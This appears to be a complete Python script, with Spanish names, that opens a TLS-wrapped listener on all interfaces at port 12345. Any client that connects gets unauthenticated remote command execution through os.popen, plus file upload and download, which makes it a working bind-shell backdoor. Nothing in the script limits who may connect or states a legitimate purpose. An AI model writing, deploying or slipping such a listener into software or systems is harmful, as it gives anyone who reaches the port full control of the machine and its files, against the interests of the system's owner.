import socket
import ssl
import os

def ejecutar_comando(comando):
    if comando.lower().startswith("cd "):
        nuevo_directorio = comando[3:]
        try:
            os.chdir(nuevo_directorio)
            return "Directorio cambiado correctamente."
        except Exception as e:
            return f"Error al cambiar de directorio: {e}"
    else:
        try:
            salida = os.popen(comando).read()
            return salida
        except Exception as e:
            return f"Error al ejecutar el comando: {e}"

def manejar_conexion(cliente):
    while True:
        comando = cliente.recv(4096).decode('utf-8', errors='replace')
        if comando.lower() == 'salir':
            break
        elif comando.lower().startswith("subir "):
            _, nombre_archivo, tamano = comando.split()
            tamano = int(tamano)
            with open(nombre_archivo, 'wb') as f:
                while tamano > 0:
                    datos = cliente.recv(min(4096, tamano))
                    f.write(datos)
                    tamano -= len(datos)
            cliente.sendall(b"Archivo subido correctamente.")
        elif comando.lower().startswith("descargar "):
            _, nombre_archivo = comando.split()
            if os.path.exists(nombre_archivo):
                cliente.sendall(f"tamano {os.path.getsize(nombre_archivo)}".encode('utf-8'))
                with open(nombre_archivo, 'rb') as f:
                    cliente.sendfile(f)
            else:
                cliente.sendall(b"Error: El archivo no existe.")
        else:
            salida = ejecutar_comando(comando)
            cliente.sendall(salida.encode('utf-8'))
    cliente.close()

def crear_servidor(puerto):
    contexto = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    contexto.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind(('0.0.0.0', puerto))
    servidor.listen(5)
    print(f'Servidor escuchando en el puerto {puerto}...')
    while True:
        cliente, direccion = servidor.accept()
        conexion_segura = contexto.wrap_socket(cliente, server_side=True)
        print(f'Conexión establecida con {direccion}')
        manejar_conexion(conexion_segura)

if __name__ == '__main__':
    puerto = 12345
    crear_servidor(puerto)
